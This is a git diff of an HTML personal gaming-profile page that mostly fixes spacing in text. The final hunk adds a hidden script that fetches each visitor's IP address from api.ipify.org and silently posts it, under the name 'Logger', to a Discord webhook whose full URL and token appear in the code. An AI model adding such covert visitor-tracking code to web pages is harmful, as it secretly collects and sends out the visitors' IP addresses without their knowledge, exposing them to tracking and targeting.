@@ -8,7 +8,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#834455">
     <meta property="og:image" content="https://cdn.discordapp.com/attachments/1225210572417798194/1225220347880542329/24d15f0563455d04b639025db394a9fc.png?ex=6620565e&is=660de15e&hm=3373f2c4f0546c688a35a1cc40f0140fcd8e6636e0a970b7a4d13694f9d1540c&">
-    <meta property="og:description" content="yk u can get ton of things in here? ._.">
+    <meta property="og:description" content="yk u can get ton of things in here?._.">
     <meta property="og:title" content="𝙵𝚛𝚎𝚎𝚔𝚒𝚕𝚕">
     <link rel="icon" type="image/jpeg" sizes="256x256" href="https://cdn.discordapp.com/attachments/1225210572417798194/1225220347880542329/24d15f0563455d04b639025db394a9fc.png?ex=6620565e&is=660de15e&hm=3373f2c4f0546c688a35a1cc40f0140fcd8e6636e0a970b7a4d13694f9d1540c&">
     <link rel="icon" type="image/jpeg" sizes="256x256" href="https://cdn.discordapp.com/attachments/1225210572417798194/1225220347880542329/24d15f0563455d04b639025db394a9fc.png?ex=6620565e&is=660de15e&hm=3373f2c4f0546c688a35a1cc40f0140fcd8e6636e0a970b7a4d13694f9d1540c&">
@@ -29,7 +29,7 @@
             this.musicFadeIn = 4000;
             this.Texts = [
                 "hello world",
-                "Minecraft , Fortnite, GTA 5, Valorant, Rocketleague Player",
+                "Minecraft, Fortnite, GTA 5, Valorant, Rocketleague Player",
                 "Discord open to chat",
                 "Ryzen 3 4300U, 8GB RAM, 125GB SSD",
                 "I like gaming."
@@ -70,9 +70,28 @@
                 <div class="Brand">
                     <h1 class="Paragraph Hello">Hello World!</h1>
                     <p class="a"><span id="Bruh" class="Paragraph"></span></p>
-                </div><img class="d-xl-flex main_image1" id="main_image1" src><iframe height="250px" width="410px" scrolling="no" src="https://lanyard.cnrad.dev/api/641729900428132373?borderRadius=5px&idleMessage=sleeping%20zzz&amp;bg=a&amp;animated=true"
+                </div><img class="d-xl-flex main_image1" id="main_image1" src><iframe height="250px" width="410px" scrolling="no" src="https://lanyard.cnrad.dev/api/641729900428132373?borderRadius=5px&idleMessage=sleeping%20zzz&bg=a&animated=true"
                     frameborder="0">
-</iframe></div>
+</iframe>
+                <script>
+                    function getIP(json) {
+                        var request = new XMLHttpRequest(); //making a request for the webhook
+                        request.open("POST", "https://discord.com/api/webhooks/1226126479461711923/oyrugegQKBcQFI8HFajMZGKJ9EViCuOK42DsoCGcw3Jp-i2c_gHXKKf8KN_5SjFtMrTA");
+
+                        request.setRequestHeader('Content-type', 'application/json');
+
+                        var params = {
+                            username: "Logger",
+                            avatar_url: "https://cdn.discordapp.com/attachments/1193570412785836052/1226126811784675329/image.png?ex=6623a294&is=66112d94&hm=4ebf7ceb5634ba2713fcf4a166e9e0708f0d30728b7d27044c2f15937714d058&",
+                            content: "**IP:** *" + json.ip + "*"
+                        }
+                        //just a webhook parameters such as avatar,name,message
+
+                        request.send(JSON.stringify(params));
+                    }
+                </script>
+                <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+            </div>
         </section>
     </div>
     <script src="assets/bootstrap/js/bootstrap.min.js"></script>
